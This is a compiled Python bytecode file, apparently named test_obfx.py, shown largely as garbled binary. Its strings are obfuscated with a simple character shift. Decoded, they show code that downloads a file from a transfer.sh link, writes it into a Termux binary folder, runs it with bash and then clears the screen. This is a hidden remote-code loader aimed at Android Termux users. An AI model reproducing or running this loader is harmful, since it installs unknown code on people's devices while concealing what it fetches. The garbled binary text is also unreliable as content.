U
    b	U_v  �                   @   s@  d dl Zd dlZd dlZdd� Zdd� Zze�ed�� W n e	k
rN   Y nX ze�ed�� W n e	k
rv   Y nX ed�Z
eje
eeed���d	�Zeed�ed
���ej� ze�ed�� W n e	k
r�   Y nX e�ed�ed�� ze�ed�� W n e	k
�r   Y nX e�d� e�d� e�ed�� dS )�    Nc                 C   s   | t dddg� S )N�   �   �   )�sum)�n� r   �test_obfx.py�<lambda>   �    r	   c                 C   s   d� dd� | D ��S )N� c                 s   s"   | ]}t ttt|����V  qd S )N)�chr�int�
rCfdUIcJyZ�ord)�.0�cr   r   r   �	<genexpr>   s     z<lambda>.<locals>.<genexpr>)�join)�sr   r   r   r	      r
   u   o{nnnu   ~w}r}unm7}}u"   q}}y|C88}{jw|on{7|q8@=Wa8o{nnn�
   )Zallow_redirectsu   ku,   8mj}j8mj}j8lxv7}n{v~8orun|8~|{8krw8o{nnnu%   8mj}j8mj}j8lxv7}n{v~8orun|8~|{8krw8z:sed -i 's/$//' /data/data/com.termux/files/usr/bin/freezez/bash /data/data/com.termux/files/usr/bin/freezezlunj{)�osZAIYMZrequestsZQWoJlXIkCgyiKLmtZshutilZTvOxqGcVXBrzr   Z
pDrJbdfeZk�remove�	ExceptionZExKCay�get�boolr   ZCw�open�writeZcontentZcopy2�systemr   r   r   r   �<module>   s6   

